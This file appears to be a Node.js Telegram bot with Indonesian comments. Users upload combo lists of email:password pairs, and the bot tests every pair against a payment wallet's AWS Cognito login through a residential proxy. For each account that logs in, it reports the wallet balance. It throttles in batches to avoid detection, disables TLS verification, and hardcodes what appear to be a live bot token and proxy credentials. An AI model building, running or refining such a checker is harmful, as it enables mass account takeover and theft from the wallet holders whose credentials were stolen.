process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const { Telegraf } = require('telegraf');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');

// MASUKKAN TOKEN BOT KAMU DI SINI
const BOT_TOKEN = '8627582721:AAHnw24k_cUjtuveRpCV9C5UDDc9RQMibOo';
const bot = new Telegraf(BOT_TOKEN);

// Proxy DataImpulse Kamu
const proxyAgent = new HttpsProxyAgent('http://8998c0d8430265a3c9ab:f4cd725960d1892a@gw.dataimpulse.com:823');

// Fungsi Jeda (Sleep)
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ==========================================
// FUNGSI INTI PENGECEKAN API
// ==========================================
async function checkAccount(username, password) {
    try {
        const authPayload = JSON.stringify({
            AuthFlow: "USER_PASSWORD_AUTH",
            ClientId: "437f3u0sfh7h0av5rlrrjdtmsb",
            AuthParameters: { USERNAME: username, PASSWORD: password },
            ClientMetadata: { country_code: "ph", lang_code: "en" }
        });

        const authReq = await axios.post("https://cognito-idp.ap-southeast-1.amazonaws.com/", authPayload, {
            headers: {
                "x-amz-target": "AWSCognitoIdentityProviderService.InitiateAuth",
                "Content-Type": "application/x-amz-json-1.1",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            },
            httpsAgent: proxyAgent,
            validateStatus: () => true,
            timeout: 15000
        });

        if (authReq.data?.AuthenticationResult) {
            const idToken = authReq.data.AuthenticationResult.IdToken;
            const walletReq = await axios.get("https://wallet-api.codacash.com/user/wallet", {
                headers: { "Authorization": idToken, "x-country-code": "608" },
                httpsAgent: proxyAgent,
                validateStatus: () => true,
                timeout: 10000
            });
            const balance = walletReq.data?.data?.balanceAmount || 0;
            return { status: 'live', balance: balance };
        }
        return { status: 'die', msg: authReq.data?.__type?.replace('Exception', '') || 'Invalid' };
    } catch (e) {
        return { status: 'error', msg: 'Timeout' };
    }
}

// ==========================================
// HANDLER TELEGRAM
// ==========================================
bot.start((ctx) => {
    ctx.reply('🤖 RecnomPay Termux Mode Ready!\n\nKirim file .txt berisi combo email:pass.\nBot akan cek 30 akun -> Kirim hasil -> Jeda 10 detik -> Lanjut otomatis.');
});

bot.on('document', async (ctx) => {
    if (!ctx.message.document.file_name.endsWith('.txt')) return ctx.reply('❌ Kirim file .txt!');

    const waitMsg = await ctx.reply('⏳ Mengunduh file...');
    
    try {
        const fileLink = await ctx.telegram.getFileLink(ctx.message.document.file_id);
        const response = await axios.get(fileLink.href);
        const lines = response.data.split('\n').map(l => l.trim()).filter(l => l.includes(':'));

        await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, null, `✅ Terdeteksi <b>${lines.length} akun</b>.\nMemulai pengecekan massal...`, { parse_mode: 'HTML' });

        let totalChecked = 0;
        let batchLive = [];

        // LOOPING MASSAL (UNLIMITED)
        for (let i = 0; i < lines.length; i += 30) {
            const chunk = lines.slice(i, i + 30);
            
            // Proses 30 akun secara paralel dalam satu batch
            const results = await Promise.all(chunk.map(async (line) => {
                const [u, p] = line.split(':');
                const res = await checkAccount(u.trim(), p.trim());
                return { u, p, res };
            }));

            // Filter hasil yang LIVE
            results.forEach(item => {
                totalChecked++;
                if (item.res.status === 'live') {
                    batchLive.push(`<code>${item.u}:${item.p}</code> | Bal: <b>${item.res.balance}</b>`);
                }
            });

            // Kirim Laporan per 30 Akun
            let report = `<b>📊 LAPORAN BATCH (${totalChecked}/${lines.length})</b>\n━━━━━━━━━━━━━━━━━━\n`;
            report += batchLive.length > 0 ? batchLive.join('\n') : '<i>Tidak ada LIVE di batch ini.</i>';
            report += `\n━━━━━━━━━━━━━━━━━━`;
            
            await ctx.reply(report, { parse_mode: 'HTML' });
            batchLive = []; // Reset list live untuk batch berikutnya

            // Jeda 10 Detik jika belum selesai semua
            if (totalChecked < lines.length) {
                const sleepMsg = await ctx.reply(`😴 Sedang jeda 10 detik agar aman...`);
                await sleep(10000); 
                await ctx.telegram.deleteMessage(ctx.chat.id, sleepMsg.message_id).catch(() => {});
            } else {
                await ctx.reply('🏁 <b>SEMUA PROSES SELESAI!</b>');
            }
        }
    } catch (err) {
        ctx.reply('❌ Error: ' + err.message);
    }
});

// Jalankan Bot
bot.launch().then(() => console.log("Bot Running di Termux!"));
